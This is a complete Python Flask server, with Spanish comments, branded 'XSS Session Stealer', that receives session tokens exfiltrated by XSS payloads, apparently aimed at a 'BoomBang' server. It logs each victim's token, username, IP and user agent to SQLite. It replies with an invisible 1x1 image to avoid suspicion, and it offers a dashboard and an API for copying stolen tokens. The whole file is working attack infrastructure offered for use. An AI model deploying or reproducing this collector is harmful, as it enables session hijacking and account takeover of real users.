#!/usr/bin/env python3
"""
XSS Session Stealer - Servidor de recolección de tokens de sesión
Uso: python3 session_stealer.py
Dashboard: http://TU_VPS_IP:5000/dashboard
"""

from flask import Flask, request, jsonify
from datetime import datetime
import sqlite3
import os
import sys

app = Flask(__name__)
DB = 'stolen_sessions.db'

def init_db():
    """Inicializar base de datos SQLite"""
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT NOT NULL,
        username TEXT,
        user_id INTEGER,
        ip_address TEXT,
        user_agent TEXT,
        timestamp TEXT NOT NULL
    )''')

    c.execute('''CREATE INDEX IF NOT EXISTS idx_timestamp
                 ON sessions(timestamp DESC)''')

    c.execute('''CREATE INDEX IF NOT EXISTS idx_username
                 ON sessions(username)''')

    conn.commit()
    conn.close()
    print('[✓] Base de datos inicializada')

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    """Endpoint para recibir tokens robados"""
    # Obtener parámetros
    token = request.args.get('token', request.form.get('token', 'NO_TOKEN'))
    username = request.args.get('user', request.form.get('user', 'Unknown'))
    user_id = request.args.get('uid', request.form.get('uid', 0))

    # Información adicional
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().isoformat()

    # Guardar en base de datos
    try:
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute('''INSERT INTO sessions
                     (token, username, user_id, ip_address, user_agent, timestamp)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (token, username, user_id, ip_address, user_agent, timestamp))
        conn.commit()
        session_id = c.lastrowid
        conn.close()

        # Log en consola
        print(f'\n{"="*60}')
        print(f'[+] NUEVA SESIÓN ROBADA #{session_id}')
        print(f'{"="*60}')
        print(f'Usuario     : {username} (ID: {user_id})')
        print(f'Token       : {token[:50]}...')
        print(f'IP          : {ip_address}')
        print(f'User-Agent  : {user_agent[:50]}...')
        print(f'Timestamp   : {timestamp}')
        print(f'{"="*60}\n')

        # También guardar en log
        with open('logs/sessions.log', 'a') as f:
            f.write(f'[{timestamp}] {username} | {token[:30]}... | {ip_address}\n')

    except Exception as e:
        print(f'[✗] Error al guardar sesión: {e}')
        return jsonify({'error': str(e)}), 500

    # Responder con imagen 1x1 transparente (no levanta sospechas)
    return '<svg width="1" height="1"></svg>', 200, {'Content-Type': 'image/svg+xml'}

@app.route('/dashboard')
def dashboard():
    """Dashboard web para visualizar sesiones robadas"""
    try:
        conn = sqlite3.connect(DB)
        c = conn.cursor()

        # Estadísticas
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]

        c.execute('SELECT COUNT(DISTINCT username) FROM sessions')
        unique_users = c.fetchone()[0]

        c.execute('''SELECT COUNT(*) FROM sessions
                     WHERE timestamp > datetime('now', '-1 hour')''')
        last_hour = c.fetchone()[0]

        # Últimas 100 sesiones
        c.execute('''SELECT * FROM sessions
                     ORDER BY id DESC LIMIT 100''')
        sessions = c.fetchall()

        conn.close()

        # Generar HTML
        html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 XSS Session Stealer Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .header {
            background: linear-gradient(90deg, #1a1a1a, #2a2a2a);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 2px solid #00ff00;
        }
        .header h1 {
            font-size: 32px;
            text-shadow: 0 0 10px #00ff00;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #00ff00;
        }
        .stat-box h3 { color: #00dd00; margin-bottom: 5px; }
        .stat-box p { font-size: 24px; font-weight: bold; }
        .session-card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            transition: all 0.3s;
        }
        .session-card:hover {
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        .session-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .username {
            font-size: 18px;
            font-weight: bold;
            color: #00ffff;
        }
        .session-id {
            color: #888;
            font-size: 12px;
        }
        .token-field {
            background: #0a0a0a;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            word-break: break-all;
            font-size: 12px;
        }
        .meta {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 10px;
            font-size: 12px;
        }
        .meta-item {
            color: #888;
        }
        .meta-item strong {
            color: #00ff00;
        }
        .copy-btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 5px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        .copy-btn:hover {
            background: #00dd00;
        }
        .no-sessions {
            text-align: center;
            padding: 50px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 XSS Session Stealer Dashboard</h1>
        <p>BoomBang Server - Pentesting Tools</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>Total Sesiones</h3>
            <p>''' + str(total) + '''</p>
        </div>
        <div class="stat-box">
            <h3>Usuarios Únicos</h3>
            <p>''' + str(unique_users) + '''</p>
        </div>
        <div class="stat-box">
            <h3>Última Hora</h3>
            <p>''' + str(last_hour) + '''</p>
        </div>
    </div>

    <h2>📋 Últimas 100 Sesiones Capturadas</h2>
    <div style="margin-top: 20px;">
'''

        if not sessions:
            html += '''
        <div class="no-sessions">
            <h2>🔍 No hay sesiones capturadas todavía</h2>
            <p>Esperando que el XSS sea ejecutado...</p>
        </div>
'''
        else:
            for s in sessions:
                session_id, token, username, user_id, ip, ua, ts = s
                html += f'''
        <div class="session-card">
            <div class="session-header">
                <span class="username">👤 {username or "Unknown"}</span>
                <span class="session-id">#{session_id}</span>
            </div>

            <div class="token-field">
                <strong>Token:</strong><br>
                <span id="token-{session_id}">{token}</span><br>
                <button class="copy-btn" onclick="copyToken('token-{session_id}')">📋 Copiar Token</button>
            </div>

            <div class="meta">
                <div class="meta-item">
                    <strong>User ID:</strong> {user_id or "N/A"}
                </div>
                <div class="meta-item">
                    <strong>IP:</strong> {ip}
                </div>
                <div class="meta-item">
                    <strong>Timestamp:</strong> {ts}
                </div>
            </div>

            <div class="meta" style="margin-top: 10px;">
                <div class="meta-item" style="grid-column: 1/-1;">
                    <strong>User-Agent:</strong><br>{ua or "Unknown"}
                </div>
            </div>
        </div>
'''

        html += '''
    </div>

    <script>
        function copyToken(elementId) {
            const tokenElement = document.getElementById(elementId);
            const token = tokenElement.innerText;

            navigator.clipboard.writeText(token).then(() => {
                alert('✅ Token copiado al portapapeles');
            }).catch(err => {
                console.error('Error al copiar:', err);
            });
        }

        // Auto-refresh cada 5 segundos
        setTimeout(() => {
            location.reload();
        }, 5000);
    </script>
</body>
</html>
'''
        return html

    except Exception as e:
        return f'<h1>Error</h1><pre>{str(e)}</pre>', 500

@app.route('/api/sessions', methods=['GET'])
def api_sessions():
    """API JSON para obtener sesiones programáticamente"""
    try:
        limit = int(request.args.get('limit', 50))

        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute(f'SELECT * FROM sessions ORDER BY id DESC LIMIT {limit}')
        sessions = c.fetchall()
        conn.close()

        result = []
        for s in sessions:
            result.append({
                'id': s[0],
                'token': s[1],
                'username': s[2],
                'user_id': s[3],
                'ip_address': s[4],
                'user_agent': s[5],
                'timestamp': s[6]
            })

        return jsonify({'total': len(result), 'sessions': result})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'ok',
        'service': 'XSS Session Stealer',
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    # Banner
    print('\n' + '='*60)
    print('🔥  XSS SESSION STEALER - BoomBang Pentesting')
    print('='*60)

    # Crear directorio de logs si no existe
    os.makedirs('logs', exist_ok=True)

    # Inicializar DB
    init_db()

    # Información
    print(f'\n[*] Servidor iniciando...')
    print(f'[*] Dashboard disponible en: http://0.0.0.0:5000/dashboard')
    print(f'[*] API endpoint: http://0.0.0.0:5000/api/sessions')
    print(f'[*] Health check: http://0.0.0.0:5000/health')
    print(f'[*] Colector de sesiones: http://0.0.0.0:5000/steal')
    print(f'\n[!] Asegúrate de reemplazar TU_VPS_IP en los payloads JavaScript')
    print(f'[!] Puerto 5000 debe estar abierto en el firewall')
    print('='*60 + '\n')

    # Iniciar servidor
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    except KeyboardInterrupt:
        print('\n\n[*] Servidor detenido por el usuario')
        sys.exit(0)
    except Exception as e:
        print(f'\n[✗] Error al iniciar servidor: {e}')
        sys.exit(1)
